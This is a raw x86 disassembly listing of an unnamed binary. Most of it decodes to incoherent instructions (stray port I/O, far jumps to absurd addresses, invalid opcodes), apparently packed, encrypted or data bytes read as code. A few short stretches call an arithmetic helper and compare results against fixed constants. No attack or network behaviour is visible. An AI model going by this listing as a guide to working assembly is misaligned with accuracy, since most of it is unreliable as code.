  41aa7e:	push   es
  41aa7f:	data16 ror BYTE PTR [ebp+0x9],0x5a
  41aa84:	out    0x30,eax
  41aa86:	or     BYTE PTR [ebx+0x3],dh
  41aa89:	xor    eax,0x9c1510ae
  41aa8e:	xchg   esi,eax
  41aa8f:	cmp    eax,0xb23adb28
  41aa94:	xor    al,0xf5
  41aa96:	sar    DWORD PTR [eax],cl
  41aa98:	mov    edx,edx
  41aa9a:	jle    0x41aa8d
  41aa9c:	xchg   ebx,eax
  41aa9d:	shr    edx,0xbd
  41aaa0:	imul   ecx,eax,0xf8bf728
  41aaa6:	sub    al,0x41
  41aaa8:	test   ebx,esp
  41aaaa:	aam    0xe1
  41aaac:	mov    bx,0xd9dc
  41aab0:	out    dx,eax
  41aab1:	push   esi
  41aab2:	adc    eax,0x2ecfe8ac
  41aab7:	mov    ecx,0xb38ae805
  41aabc:	xor    BYTE PTR [ebx+0x14],bl
  41aabf:	inc    ebp
  41aac0:	pop    edx
  41aac1:	dec    esi
  41aac2:	scas   al,BYTE PTR es:[edi]
  41aac3:	out    dx,al
  41aac4:	ret    
  41aac5:	and    eax,0x54fc5d40
  41aaca:	adc    eax,0xec9ee581
  41aacf:	hlt    
  41aad0:	(bad)  
  41aad1:	dec    ecx
  41aad2:	mov    bl,0xb9
  41aad4:	xchg   DWORD PTR [eax+edi*1-0x14],ebp
  41aad8:	push   DWORD PTR [esi]
  41aada:	(bad)  
  41aadc:	jle    0x41ab3d
  41aade:	jne    0x41aad0
  41aae0:	outs   dx,BYTE PTR ds:[esi]
  41aae1:	xchg   ebx,eax
  41aae2:	xchg   edi,eax
  41aae3:	aad    0x3a
  41aae5:	add    BYTE PTR [ebp-0x6b],bl
  41aae8:	lods   eax,DWORD PTR ds:[esi]
  41aae9:	and    cl,dl
  41aaeb:	cmp    bh,BYTE PTR [esi+0x7ab73c2e]
  41aaf1:	push   esp
  41aaf2:	mov    edi,0xc73b0b63
  41aaf7:	(bad)  
  41aaf8:	sti    
  41aaf9:	rol    BYTE PTR ss:[edx+0x33],0x12
  41aafe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aaff:	leave  
  41ab00:	(bad)  
  41ab01:	shl    DWORD PTR [eax],cl
  41ab03:	dec    ecx
  41ab04:	cdq    
  41ab05:	mov    ebx,DWORD PTR cs:[esp+0x34]
  41ab0a:	push   ebx
  41ab0b:	push   ecx
  41ab0c:	push   edx
  41ab0d:	push   eax
  41ab0e:	call   0x42206f
  41ab13:	mov    ecx,DWORD PTR [esp+0x48]
  41ab17:	mov    ebx,DWORD PTR [esp+0x4c]
  41ab1b:	push   ebx
  41ab1c:	push   ecx
  41ab1d:	push   edx
  41ab1e:	push   eax
  41ab1f:	call   0x42206f
  41ab24:	mov    ecx,DWORD PTR [esp+0x50]
  41ab28:	mov    ebx,DWORD PTR [esp+0x54]
  41ab2c:	add    eax,ecx
  41ab2e:	mov    ecx,DWORD PTR [esp+0x88]
  41ab35:	adc    edx,ebx
  41ab37:	mov    ebx,DWORD PTR [esp+0x8c]
  41ab3e:	cmp    ecx,eax
  41ab40:	jne    0x41af1d
  41ab46:	cmp    ebx,edx
  41ab48:	jmp    0x41af17
  41ab4d:	xchg   esi,eax
  41ab4e:	loope  0x41ab41
  41ab50:	gs pop esi
  41ab52:	fs jp  0x41ab2f
  41ab55:	aam    0x4d
  41ab57:	imul   esi,DWORD PTR [eax-0x4f7e3f6f],0x72
  41ab5e:	lahf   
  41ab5f:	push   ss
  41ab60:	sbb    BYTE PTR [edx+edx*1-0x445fe7e8],bh
  41ab67:	mov    cl,0x2f
  41ab69:	or     DWORD PTR ds:0x39849bf7,0x322f75c4
  41ab73:	call   0x9f0d:0x6eae689a
  41ab7a:	push   ss
  41ab7b:	out    dx,al
  41ab7c:	shl    DWORD PTR [edx-0x127c3b50],0xa5
  41ab83:	out    0x35,al
  41ab85:	fwait
  41ab86:	xchg   DWORD PTR [ecx+0x74],esi
  41ab89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab8a:	test   al,0x68
  41ab8c:	pop    ecx
  41ab8d:	cmp    al,al
  41ab8f:	mov    edi,0xad0ff14d
  41ab94:	pop    edi
  41ab95:	sub    eax,0x3eafecb2
  41ab9a:	test   DWORD PTR [esi],ebp
  41ab9c:	lahf   
  41ab9d:	cmp    esi,0x2f
  41aba0:	inc    ecx
  41aba1:	pop    esi
  41aba2:	push   0xffffffd4
  41aba4:	jp     0x41ab43
  41aba6:	add    BYTE PTR [ecx+edx*8-0x51],0xe4
  41abab:	dec    esp
  41abac:	jp     0x41abe0
  41abae:	retf   0x1b31
  41abb1:	mov    esi,0x9d3da3da
  41abb6:	fldcw  WORD PTR [ebx]
  41abb8:	in     al,0x9c
  41abba:	(bad)  
  41abbc:	adc    dl,BYTE PTR [ecx+0x7350fe61]
  41abc2:	mov    BYTE PTR [edx],0x72
  41abc5:	lods   eax,DWORD PTR ds:[si]
  41abc7:	inc    edx
  41abc8:	in     eax,0x77
  41abca:	daa    
  41abcb:	shr    DWORD PTR [ebp+0x1807ecc9],0x8
  41abd2:	dec    ebx
  41abd3:	mov    eax,0x1e0a3cdc
  41abd8:	push   cs
  41abd9:	sti    
  41abda:	mov    cl,0x94
  41abdc:	sub    BYTE PTR [ecx-0x18],bl
  41abdf:	push   es
  41abe0:	dec    ebp
  41abe1:	jmp    0x11948fd3
  41abe6:	mov    ds:0x10917c39,al
  41abeb:	loopne 0x41ac37
  41abed:	cli    
  41abee:	and    eax,0xc1d8a7d7
  41abf3:	or     al,0x28
  41abf5:	aaa    
  41abf6:	inc    ecx
  41abf7:	aas    
  41abf8:	iret   
  41abf9:	sub    al,0x3b
  41abfb:	sub    BYTE PTR [esp+eax*8],0xed
  41abff:	icebp  
  41ac00:	retf   
  41ac01:	jae    0x41abbc
  41ac03:	pop    ecx
  41ac04:	add    al,0x60
  41ac06:	xor    ebx,DWORD PTR [esi+eax*8+0x37a7bc58]
  41ac0d:	xchg   BYTE PTR [esp+ebx*8+0x2875283e],ah
  41ac14:	(bad)
  41ac17:	leave  
  41ac18:	dec    ecx
  41ac19:	pop    ebx
  41ac1a:	in     eax,0x1f
  41ac1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac1d:	inc    eax
  41ac1e:	shl    DWORD PTR [ebx+edi*2+0x477bbaba],0x66
  41ac26:	rcr    BYTE PTR [ecx+edi*2],0x48
  41ac2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac2b:	push   0xffffff87
  41ac2d:	add    edi,edi
  41ac2f:	add    al,0x70
  41ac31:	mov    dl,0xf
  41ac33:	pusha  
  41ac34:	and    ebp,ebp
  41ac36:	adc    BYTE PTR [ecx],dh
  41ac38:	loope  0x41ac9b
  41ac3a:	jle    0x41ac13
  41ac3c:	dec    ebx
  41ac3d:	(bad)
  41ac41:	xor    al,BYTE PTR [ebx+0x6bf14970]
  41ac47:	mov    ds:0x629faf85,eax
  41ac4c:	cmp    eax,0xa371ea9f
  41ac51:	adc    DWORD PTR [ebp-0x2f274179],edi
  41ac57:	cli    
  41ac58:	sub    eax,0xe9d2e353
  41ac5d:	inc    edi
  41ac5e:	pop    es
  41ac5f:	aaa    
  41ac60:	mov    edx,0xec964635
  41ac65:	mov    bh,0x2e
  41ac67:	mov    ecx,0xc238a67d
  41ac6c:	cs push cs
  41ac6e:	cdq    
  41ac6f:	test   DWORD PTR [edx-0x1eecda8a],esp
  41ac75:	mov    fs,WORD PTR [eax+0x78]
  41ac78:	add    DWORD PTR [ecx+0x6b06e288],ebx
  41ac7e:	imul   ecx,DWORD PTR [ecx+0x61],0xeaf94170
  41ac85:	icebp  
  41ac86:	add    bh,BYTE PTR [ebx-0x6]
  41ac89:	outs   dx,DWORD PTR ds:[esi]
  41ac8a:	dec    edi
  41ac8b:	xor    al,0x3b
  41ac8d:	ins    BYTE PTR es:[edi],dx
  41ac8e:	fisub  WORD PTR [edi-0x7d]
  41ac91:	sar    DWORD PTR [ebx],0x5
  41ac94:	xor    eax,0x90f85ba0
  41ac99:	xchg   ch,dl
  41ac9b:	mov    ecx,0x5dcc68f4
  41aca0:	mov    al,0xaa
  41aca2:	loopne 0x41ac8d
  41aca4:	jg     0x41ac62
  41aca6:	dec    ebp
  41aca7:	mov    cl,0x75
  41aca9:	pusha  
  41acaa:	pop    esi
  41acab:	repz mul BYTE PTR [ebx+0x13]
  41acaf:	in     eax,dx
  41acb0:	add    BYTE PTR [ebx-0x63],dl
  41acb3:	inc    eax
  41acb5:	int3   
  41acb6:	inc    esp
  41acb7:	fist   DWORD PTR [ecx+0x105e889a]
  41acbd:	xchg   ebp,eax
  41acbe:	mov    eax,ds:0x740bd41a
  41acc3:	popa   
  41acc4:	imul   ebx,DWORD PTR [edx-0x6f9cfff9],0x36
  41accb:	std    
  41accc:	add    DWORD PTR [edi+eax*4+0x4b],esi
  41acd0:	das    
  41acd1:	xchg   ecx,eax
  41acd2:	repz pop esp
  41acd4:	adc    al,0x16
  41acd6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41acd7:	hlt    
  41acd8:	sub    cl,BYTE PTR [ebp+ebx*2+0x79]
  41acdc:	dec    ecx
  41acdd:	inc    edx
  41acde:	mov    edi,0x95892536
  41ace3:	leave  
  41ace4:	push   0xffffffca
  41ace6:	inc    ebp
  41ace7:	cs aad 0x53
  41acea:	jo     0x41ac76
  41acec:	xchg   ebx,eax
  41aced:	or     DWORD PTR [ebx+0x57194c82],ebp
  41acf3:	(bad)  [ecx+0x1e3b2cdd]
  41acf9:	fidivr DWORD PTR [eax]
  41acfb:	sub    BYTE PTR [ecx-0x32497624],0x1e
  41ad02:	jecxz  0x41ad1b
  41ad04:	sbb    cl,BYTE PTR [ebp+0x4e]
  41ad07:	ror    DWORD PTR [edx-0x7d],0x17
  41ad0b:	jmp    0x239c:0x435164d0
  41ad12:	inc    ebx
  41ad13:	push   eax
  41ad14:	push   ebp
  41ad15:	lods   eax,DWORD PTR ds:[esi]
  41ad16:	out    dx,eax
  41ad17:	ins    BYTE PTR es:[edi],dx
  41ad18:	pop    ebx
  41ad19:	call   0xeb3b9366
  41ad1e:	xchg   edi,eax
  41ad1f:	cwde   
  41ad20:	mov    bh,0x84
  41ad22:	mov    edx,0xe3a2ca1d
  41ad27:	mov    bh,0x2a
  41ad29:	xchg   ebx,eax
  41ad2a:	lahf   
  41ad2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad2c:	sbb    eax,0x48e32e9d
  41ad31:	scas   al,BYTE PTR es:[edi]
  41ad32:	arpl   WORD PTR [edi],bx
  41ad34:	cmp    cl,BYTE PTR ds:[ebp-0x10f71d65]
  41ad3b:	outs   dx,DWORD PTR es:[esi]
  41ad3d:	jae    0x41ad09
  41ad3f:	popa   
  41ad40:	fwait
  41ad41:	pusha  
  41ad42:	pop    edi
  41ad43:	mov    BYTE PTR [bp+di+0x51a1],cl
  41ad48:	cmp    BYTE PTR [eax-0x2c],dh
  41ad4b:	mov    bh,0x96
  41ad4d:	push   edi
  41ad4e:	aas    
  41ad4f:	and    ebx,DWORD PTR [edx-0xfb499aa]
  41ad55:	mov    bl,0xd3
  41ad57:	push   esi
  41ad58:	std    
  41ad59:	test   eax,0x28e6dec
  41ad5e:	cdq    
  41ad5f:	retf   
  41ad60:	sbb    edi,DWORD PTR [esi-0x7d]
  41ad63:	push   0xa1bc2c35
  41ad68:	and    cl,ah
  41ad6a:	cmc    
  41ad6b:	add    ecx,esp
  41ad6d:	fld    TBYTE PTR [eax]
  41ad6f:	dec    esi
  41ad70:	pop    es
  41ad71:	jg     0x41ad72
  41ad73:	xor    BYTE PTR [ebx-0x2e],cl
  41ad76:	stos   DWORD PTR es:[edi],eax
  41ad77:	ret    
  41ad78:	mov    edx,0xeb183389
  41ad7d:	inc    esp
  41ad7e:	je     0x41ad87
  41ad80:	push   edi
  41ad81:	imul   ebp,DWORD PTR [edi],0x366d4a2
  41ad87:	cdq    
  41ad88:	xchg   ebp,eax
  41ad89:	adc    al,0x30
  41ad8b:	cmp    ebx,eax
  41ad8d:	in     al,0x6e
  41ad8f:	in     al,dx
  41ad90:	sub    BYTE PTR [eax+0x24],cl
  41ad93:	fimul  DWORD PTR [bp+di-0x7a82]
  41ad98:	call   0xdfd4569d
  41ad9d:	mov    eax,ds:0x312d4826
  41ada2:	int3   
  41ada3:	sbb    al,cl
  41ada5:	jne    0x41adf6
  41ada7:	stc    
  41ada8:	pop    ebx
  41ada9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adaa:	sub    BYTE PTR [esi+0x66ddac62],bl
  41adb0:	xor    eax,0xf214bbbc
  41adb5:	int    0x13
  41adb7:	pop    edi
  41adb8:	push   ss
  41adb9:	cmp    eax,0x4a0a5735
  41adbe:	mov    esp,0x3d5ed421
  41adc3:	mov    ebx,0x6c81e1e4
  41adc8:	fs push ebp
  41adca:	test   al,0x83
  41adcc:	inc    eax
  41adcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41adce:	or     al,0x6d
  41add0:	cdq    
  41add1:	data16 int 0x2e
  41add4:	xor    DWORD PTR [edi-0x5133336e],ecx
  41adda:	mov    eax,0x657bedb2
  41addf:	popa   
  41ade0:	aas    
  41ade1:	dec    bx
  41ade3:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41ade5:	jne    0x41ad8b
  41ade7:	cmp    dl,BYTE PTR [eax]
  41ade9:	push   ebp
  41adea:	xchg   BYTE PTR [edx-0x27],bh
  41aded:	xor    ch,BYTE PTR [ebx+0x72cd56a]
  41adf3:	outs   dx,BYTE PTR ds:[esi]
  41adf4:	fnsave [eax]
  41adf6:	inc    edi
  41adf7:	xchg   esi,eax
  41adf8:	mov    esp,0x5c9adf18
  41adfd:	cmp    al,0x34
  41adff:	call   0x65a5:0xf9ab887e
  41ae06:	jno    0x41ae59
  41ae08:	iretw  
  41ae0a:	sbb    edi,0xffffffc8
  41ae0d:	push   ds
  41ae0e:	loopne 0x41ae28
  41ae10:	outs   dx,DWORD PTR ds:[esi]
  41ae11:	(bad)  
  41ae12:	loop   0x41ae76
  41ae14:	test   eax,0x81d453cd
  41ae19:	daa    
  41ae1a:	xor    DWORD PTR [edx],ebp
  41ae1c:	out    dx,al
  41ae1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae1e:	xchg   ah,cl
  41ae20:	ret    0x4339
  41ae23:	not    BYTE PTR ds:[eax-0x2f176132]
  41ae2a:	pusha  
  41ae2b:	inc    edi
  41ae2c:	shr    BYTE PTR cs:[edx+0x64150a4a],1
  41ae33:	cmp    ch,cl
  41ae35:	add    al,0xa7
  41ae37:	sahf   
  41ae38:	outs   dx,DWORD PTR ds:[esi]
  41ae39:	mov    ebp,0x56e01d77
  41ae3e:	push   DWORD PTR [eax]
  41ae40:	xor    bl,BYTE PTR ds:0x11989206
  41ae46:	xchg   DWORD PTR [ebp-0x36],edi
  41ae49:	int3   
  41ae4a:	stos   BYTE PTR es:[edi],al
  41ae4b:	mov    eax,0xeeec4859
  41ae50:	mov    ebx,0xb584a486
  41ae55:	push   edi
  41ae56:	es push ds
  41ae58:	cmp    al,0xd5
  41ae5a:	pop    esi
  41ae5b:	cdq    
  41ae5c:	sbb    edi,DWORD PTR [ebx]
  41ae5e:	pop    ebp
  41ae5f:	xchg   ebx,eax
  41ae60:	jno    0x41ae6a
  41ae62:	in     al,dx
  41ae63:	mov    dl,dh
  41ae65:	ins    BYTE PTR es:[edi],dx
  41ae66:	dec    esi
  41ae67:	or     esi,DWORD PTR [ebx]
  41ae69:	jp     0x41ae00
  41ae6b:	cwde   
  41ae6c:	rol    BYTE PTR [ecx+ebp*1+0x1b1f9e4f],cl
  41ae73:	(bad)  
  41ae74:	cmp    al,BYTE PTR [eax+0x1f747b15]
  41ae7a:	xlat   BYTE PTR ds:[ebx]
  41ae7b:	mov    ecx,0xfd392da1
  41ae80:	mov    ebp,DWORD PTR [ebx+esi*2-0x41]
  41ae84:	loope  0x41ae17
  41ae86:	xchg   edi,eax
  41ae87:	cmp    al,0xdb
  41ae89:	mov    al,ds:0x1165cac5
  41ae8e:	push   cs
  41ae8f:	popf   
  41ae90:	mov    esi,0xb328b374
  41ae95:	cmc    
  41ae96:	cmp    bh,al
  41ae98:	das    
  41ae99:	ror    DWORD PTR [eax-0x5b65fe3b],cl
  41ae9f:	sbb    dl,bh
  41aea1:	sbb    al,0x1
  41aea3:	icebp  
  41aea4:	mov    bh,0x66
  41aea6:	pop    esi
  41aea7:	pop    edx
  41aea8:	leave  
  41aea9:	push   edi
  41aeaa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aeab:	leave  
  41aeac:	xchg   edi,eax
  41aead:	cs test al,0x3f
  41aeb0:	jge    0x41ae48
  41aeb2:	push   0xb4b31364
  41aeb7:	ins    BYTE PTR es:[edi],dx
  41aeb8:	jp     0x41ae51
  41aeba:	adc    esi,DWORD PTR [ebp+0x73]
  41aebd:	es adc dl,bl
  41aec0:	sub    edx,DWORD PTR [edi+0x13b3e3c9]
  41aec6:	dec    eax
  41aec7:	in     eax,dx
  41aec8:	mov    cl,0xc7
  41aeca:	xchg   ebp,eax
  41aecb:	mov    ebp,0xb550f2ae
  41aed0:	push   ss
  41aed1:	call   0x864e609d
  41aed6:	pop    ecx
  41aed7:	mov    ebp,0xbf8cf887
  41aedc:	jns    0x41ae93
  41aede:	jecxz  0x41aef0
  41aee0:	mov    ecx,0xb1d51c59
  41aee5:	fwait
  41aee6:	gs cmp al,0x84
  41aee9:	xchg   ecx,eax
  41aeea:	mov    DWORD PTR [esi],ebp
  41aeec:	dec    ebp
  41aeed:	test   al,0xe7
  41aeef:	enter  0x3aea,0xef
  41aef3:	jbe    0x41af05
  41aef5:	mov    ah,0x3a
  41aef7:	dec    edx
  41aef8:	pop    es
  41aef9:	xchg   ebp,esp
  41aefb:	and    BYTE PTR [eax-0x10bc6be],cl
  41af01:	cmp    DWORD PTR [ecx],0x8a303ba7
  41af07:	imul   al
  41af09:	dec    esp
  41af0a:	sbb    al,0xfb
  41af0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af0d:	push   ecx
  41af0e:	add    ebx,DWORD PTR [eax]
  41af10:	into   
  41af11:	out    dx,al
  41af12:	jecxz  0x41af55
  41af14:	cwde   
  41af15:	mov    ah,0xe4
  41af17:	je     0x41d921
  41af1d:	mov    eax,DWORD PTR [esp+0x40]
  41af21:	mov    edx,DWORD PTR [esp+0x18]
  41af25:	xor    ecx,ecx
  41af27:	shld   ecx,eax,0x2
  41af2b:	shl    eax,0x2
  41af2e:	mov    ebx,0xca79a575
  41af33:	mov    DWORD PTR [esp+0x10],edx
  41af37:	mov    edx,DWORD PTR [esp+0x1c]
  41af3b:	xor    eax,ebx
  41af3d:	xor    ecx,esi
  41af3f:	mov    DWORD PTR [esp+0x14],edx
  41af43:	cmp    eax,DWORD PTR [esp+0x10]
  41af47:	jne    0x41af55
  41af4d:	cmp    ecx,edx
  41af4f:	je     0x41d926
  41af55:	mov    eax,DWORD PTR [esp+0x44]
  41af59:	cmp    eax,0xa4069aaa
  41af5e:	je     0x41b750
  41af64:	mov    edx,DWORD PTR [esp+0x18]
  41af68:	mov    eax,DWORD PTR [esp+0x1c]
  41af6c:	xor    eax,esi
  41af6e:	jmp    0x41b33d
  41af73:	popa   
  41af74:	cmp    edx,ecx
  41af76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41af77:	stos   DWORD PTR es:[edi],eax
  41af78:	and    bl,BYTE PTR [esi+0x3a]
  41af7b:	ins    DWORD PTR es:[edi],dx
  41af7c:	jnp    0x41af01
  41af7e:	jl     0x41af61
  41af80:	cmp    DWORD PTR [edi-0x50],0x17
  41af84:	xchg   edi,eax
  41af85:	push   ss
  41af86:	sbb    BYTE PTR [edx+edx*1-0x4b9fe7e8],bh
  41af8d:	mov    bl,0x2f
  41af8f:	fmul   st(4),st
  41af91:	mov    eax,ds:0x79c025ea
  41af96:	pop    eax
  41af97:	in     eax,dx
  41af98:	sahf   
  41af99:	adc    esp,ebx
  41af9b:	lods   eax,DWORD PTR ds:[esi]
  41af9c:	popf   
  41af9d:	push   ecx
  41af9e:	mov    eax,ds:0x237f6714
  41afa3:	cmc    
  41afa4:	into   
  41afa5:	and    DWORD PTR [edx+eax*4+0x5754d327],0x6f
  41afad:	add    eax,0x1a804e2
  41afb2:	call   0xe843:0xcfe29ea
  41afb9:	xchg   ecx,eax
  41afba:	rcl    BYTE PTR [ebx],0x97
  41afbd:	jo     0x41b016
  41afbf:	test   DWORD PTR [esi-0x13808c41],0x110276a5
  41afc9:	hlt    
  41afca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41afcb:	dec    esp
  41afcc:	jb     0x41af63
  41afce:	or     eax,0xc1cc39c9
  41afd3:	pop    ebp
  41afd4:	cmp    esi,DWORD PTR [ebp-0x36f95d6]
  41afda:	retf   0x527e
  41afdd:	lahf   
  41afde:	call   0x74e34182
  41afe3:	hlt    
  41afe4:	inc    esp
  41afe5:	fsub   st,st(3)
  41afe7:	outs   dx,BYTE PTR ds:[esi]
  41afe8:	sahf   
  41afe9:	(bad)
  41afed:	sub    BYTE PTR [esi-0xaf3408],ah
  41aff3:	inc    ebp
  41aff4:	pop    es
  41aff5:	xchg   ebp,eax
  41aff6:	(bad)  
  41aff7:	sub    ch,BYTE PTR [edx+esi*4]
  41affa:	retf   
  41affb:	push   0xb17fd436
  41b000:	or     BYTE PTR [ebx],0x1d
  41b003:	rcl    DWORD PTR [edi-0x47],cl
  41b006:	cli    
  41b007:	mov    bl,0xd1
  41b009:	cwde   
  41b00a:	xor    dh,BYTE PTR [esi-0x23319416]
  41b010:	cmp    DWORD PTR [esi],0xffffff9d
  41b013:	cmp    eax,0x29aba0a7
  41b018:	sub    ebp,DWORD PTR [eax-0x22]
  41b01b:	sbb    esi,DWORD PTR [edi+ecx*1-0x46]
  41b01f:	sbb    cl,dl
  41b021:	pop    esp
  41b022:	mov    bl,0x38
  41b024:	xor    cl,cl
  41b026:	icebp  
  41b027:	xchg   edx,eax
  41b028:	and    al,0xfe
  41b02a:	mov    ecx,0xcc99fb5d
  41b02f:	lods   al,BYTE PTR ds:[esi]
  41b030:	clc    
  41b031:	dec    esp
  41b032:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b033:	jne    0x41b008
  41b035:	fcomp  QWORD PTR [ebx]
  41b037:	mul    al
  41b039:	mov    ebp,0xc5bf4328
  41b03e:	cdq    
  41b03f:	test   ah,bh
  41b041:	sub    DWORD PTR [ebx],ecx
  41b043:	test   BYTE PTR ds:0x3c85848,ch
  41b049:	daa    
  41b04a:	mov    dl,0x5b
  41b04c:	mov    ecx,0xf411cc90
  41b051:	inc    edx
  41b052:	lock out dx,al
  41b054:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b055:	push   cs
  41b056:	sbb    eax,0x34d62892
  41b05b:	aas    
  41b05c:	or     eax,0x961596c9
  41b061:	js     0x41b074
  41b063:	stos   BYTE PTR es:[edi],al
  41b064:	mov    bl,0x5c
  41b066:	jbe    0x41b02a
  41b068:	adc    al,0xee
  41b06a:	push   esi
  41b06b:	sar    BYTE PTR [esi+0x38b6b16c],0xa1
  41b072:	pop    esp
  41b073:	sub    BYTE PTR [edx],dl
  41b075:	(bad)  
  41b076:	cld    
  41b077:	xchg   edx,eax
  41b078:	gs (bad) 
  41b07b:	xor    eax,DWORD PTR [esi]
  41b07d:	jo     0x41b033
  41b07f:	aam    0x95
  41b081:	(bad)
  41b085:	and    al,0xb0
  41b087:	inc    ebp
  41b088:	fild   DWORD PTR [esi+0x1b]
  41b08b:	xchg   ecx,eax
  41b08c:	fimul  WORD PTR [edi]
  41b08e:	xor    bl,BYTE PTR [ebx-0x6f]
  41b091:	jb     0x41b020
  41b093:	out    0x3,eax
  41b095:	call   0xa9a9fe2d
  41b09a:	inc    edi
  41b09b:	jl     0x41b109
  41b09d:	fiadd  WORD PTR [edx]
  41b09f:	into   
  41b0a0:	jge    0x41b0c4
  41b0a2:	jne    0x41b117
  41b0a4:	popf   
  41b0a5:	mov    al,0x8a
  41b0a7:	dec    edi
  41b0a8:	push   cs
  41b0a9:	enter  0x3a9a,0x8d
  41b0ad:	or     DWORD PTR [edi+0x17262d51],edi
  41b0b3:	push   edi
  41b0b4:	nop
  41b0b5:	jmp    0xf03338aa
  41b0ba:	arpl   WORD PTR [ecx+edx*8-0x7],sp
  41b0be:	fst    st(7)
  41b0c0:	mov    ebp,0x8d33ed79
  41b0c5:	mul    DWORD PTR [ebp+0x14]
  41b0c8:	sbb    BYTE PTR es:[edi-0x1f],cl
  41b0cc:	ret    0xdfaa
  41b0cf:	es jle 0x41b0cd
  41b0d2:	nop
  41b0d3:	fadd   DWORD PTR [ebx+eiz*4-0x2ad240c4]
  41b0da:	xchg   edi,eax
  41b0db:	lock dec esp
  41b0dd:	xor    al,0xfc
  41b0df:	cmp    al,0x72
  41b0e1:	pop    es
  41b0e2:	push   ebx
  41b0e3:	xchg   ebp,eax
  41b0e4:	inc    edi
  41b0e5:	jbe    0x41b072
  41b0e7:	shr    BYTE PTR [edx+0x3c],cl
  41b0ea:	rep ins BYTE PTR es:[edi],dx
  41b0ec:	push   edi
  41b0ed:	cdq    
  41b0ee:	mov    ch,0xbb
  41b0f0:	sti    
  41b0f1:	aas    
  41b0f2:	enter  0x85c3,0x86
  41b0f6:	lds    ebx,FWORD PTR [edi]
  41b0f8:	(bad)  
  41b0f9:	outs   dx,BYTE PTR ds:[esi]
  41b0fa:	sub    eax,0xf579b0bb
  41b0ff:	inc    BYTE PTR [ebp+0x4d]
  41b102:	and    BYTE PTR [edx+0x6c],dl
  41b105:	jp     0x41b08e
  41b107:	mov    ds:0x55fc6dd,eax
  41b10c:	pop    ecx
  41b10d:	shr    BYTE PTR [ecx+0x66828323],0x93
  41b114:	int3   
  41b115:	cwde   
  41b116:	and    DWORD PTR [ebp-0xa0eedd3],0xffffffcc
  41b11d:	repz dec esp
  41b11f:	push   0xe5a2423b
  41b124:	imul   edi,DWORD PTR [esi],0xc4b98186
  41b12a:	ins    BYTE PTR es:[edi],dx
  41b12b:	xchg   esi,eax
  41b12c:	jns    0x41b12f
  41b12e:	mov    eax,edi
  41b130:	inc    esi
  41b131:	inc    ebx
  41b132:	shr    BYTE PTR [edx],cl
  41b134:	xchg   ecx,eax
  41b135:	inc    eax
  41b136:	jg     0x41b0ed
  41b138:	(bad)  
  41b139:	fiadd  WORD PTR [ecx-0x13cfd307]
  41b13f:	and    eax,esp
  41b141:	xor    esi,ecx
  41b143:	sbb    eax,0xcca4aa12
  41b148:	push   cs
  41b149:	adc    eax,edx
  41b14b:	mov    al,0x17
  41b14d:	imul   edi,DWORD PTR [eax+0x20],0xffffff93
  41b151:	jno    0x41b0d4
  41b153:	cmp    edx,DWORD PTR [ebx+0x5389b3c5]
  41b159:	ret    
  41b15a:	(bad)  
  41b15b:	mov    dl,0x47
  41b15d:	push   ss
  41b15e:	add    esp,DWORD PTR [eax+0x5312d285]
  41b164:	push   ebp
  41b165:	out    dx,al
  41b166:	(bad)  [edi]
  41b168:	push   edi
  41b169:	mov    ds:0x65eead7,al
  41b16e:	mov    dl,ch
  41b170:	xchg   esi,eax
  41b171:	dec    esi
  41b172:	ret    0xe640
  41b175:	test   eax,esi
  41b177:	xchg   esi,eax
  41b178:	cmp    ecx,DWORD PTR [eax]
  41b17a:	inc    ebx
  41b17b:	mov    ebx,0x518023a0
  41b180:	jnp    0x41b136
  41b182:	push   ss
  41b183:	inc    ecx
  41b184:	dec    edi
  41b185:	test   DWORD PTR [edx+0x2f94b52d],ebx
  41b18b:	in     al,0xbc
  41b18d:	loope  0x41b1f9
  41b18f:	xor    BYTE PTR ds:0xcfafe0d3,ah
  41b195:	pop    esi
  41b196:	retf   
  41b197:	retf   0xe1ab
  41b19a:	mov    eax,DWORD PTR [esp+esi*2+0x19]
  41b19e:	cmp    ebp,DWORD PTR [edi]
  41b1a0:	(bad)  
  41b1a1:	stos   DWORD PTR es:[edi],eax
  41b1a2:	push   ecx
  41b1a3:	add    al,BYTE PTR [ebx-0x1e52af95]
  41b1a9:	add    DWORD PTR [edi-0x17d2f207],0xffffffeb
  41b1b0:	mov    edx,DWORD PTR [ecx+0x14a9f479]
  41b1b6:	inc    edx
  41b1b7:	push   0xffffffb8
  41b1b9:	xor    ch,bh
  41b1bb:	stos   BYTE PTR es:[edi],al
  41b1bc:	mov    DWORD PTR [ebx+0x5c],esp
  41b1bf:	mov    fs,eax
  41b1c1:	in     eax,0x8d
  41b1c3:	jle    0x41b1ec
  41b1c5:	sub    BYTE PTR [ecx+0xa],al
  41b1c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c9:	xchg   esi,eax
  41b1ca:	loop   0x41b1e6
  41b1cc:	(bad)  
  41b1ce:	pop    edi
  41b1cf:	(bad)  
  41b1d0:	lods   al,BYTE PTR ds:[esi]
  41b1d1:	test   al,0xd7
  41b1d3:	lahf   
  41b1d4:	sbb    al,0x69
  41b1d6:	loopne 0x41b19d
  41b1d8:	repz sub eax,0xd83af19d
  41b1de:	out    dx,eax
  41b1df:	stos   BYTE PTR es:[edi],al
  41b1e0:	mov    ebx,0x72bc4c9e
  41b1e5:	rcr    al,cl
  41b1e7:	jle    0x41b1c8
  41b1e9:	inc    edx
  41b1ea:	imul   eax,ebp,0xffffffa0
  41b1ed:	cmp    ebx,DWORD PTR [ebx]
  41b1ef:	dec    esp
  41b1f0:	jl     0x41b201
